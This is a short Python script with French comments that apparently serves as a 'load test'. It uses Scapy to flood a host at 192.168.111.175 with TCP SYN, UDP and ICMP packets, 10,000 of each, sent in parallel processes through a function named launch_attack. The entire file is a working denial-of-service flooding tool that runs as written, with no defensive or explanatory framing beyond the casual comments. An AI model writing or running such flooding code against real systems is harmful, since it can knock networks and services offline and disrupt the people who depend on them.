from scapy.all import *
import multiprocessing
import time
from scapy.layers.inet import IP, UDP, TCP, ICMP

# Paramètres du test (c’est un peu un bordel, j’ai pas trop réfléchi)
TARGET_IP = "192.168.111.175"  # IP du switch ou de l’host
PORT = 80  # Le port où on envoie les paquets (je crois)
PACKETS = 10000  # Je vais envoyer 10000 paquets je pense
NUM_PROCESSES = 5  # Je lance 5 processus, mais ça peut être plus


# Fonction TCP qui envoie des paquets
def send_tcp():
    print("Envoi de paquets TCP...")  # Juste pour voir si ça fonctionne
    packet = IP(dst=TARGET_IP) / TCP(dport=PORT, flags="S") / Raw(load="Coucou")
    send(packet, count=PACKETS, inter=0.0001, verbose=False)  # J'ai mis un nombre de paquets, je sais pas si c'est bien


# Fonction UDP qui envoie des paquets aussi
def send_udp():
    print("Envoi de paquets UDP...")  # Ouais ça a l’air de fonctionner
    packet = IP(dst=TARGET_IP) / UDP(dport=PORT) / Raw(load="Bonjour")
    send(packet, count=PACKETS, inter=0.0001, verbose=False)


# Envoi de PING (ICMP), j’ai mis ça comme ça
def send_icmp():
    print("Envoi de pings...")  # J’espère que c’est ça
    packet = IP(dst=TARGET_IP) / ICMP() / Raw(load="Ping?")
    send(packet, count=PACKETS, inter=0.0001, verbose=False)


# Lancer les trucs en parallèle (pas sûr que ça soit optimal)
def launch_attack():
    # Je vais lancer des processus
    p1 = multiprocessing.Process(target=send_tcp)
    p2 = multiprocessing.Process(target=send_udp)
    p3 = multiprocessing.Process(target=send_icmp)

    p1.start()  # Je lance le premier
    p2.start()  # Le second
    p3.start()  # Le dernier

    p1.join()  # Attendre la fin du premier
    p2.join()  # Attendre la fin du second
    p3.join()  # Attendre le dernier


if __name__ == "__main__":
    print("Démarrage du test de charge...")  # C’est un test de charge je crois
    start_time = time.time()  # Je compte le temps pour voir combien de temps ça prend
    launch_attack()  # Lancer les attaques en même temps (je crois)
    print(f"Test terminé en {time.time() - start_time:.2f} secondes")
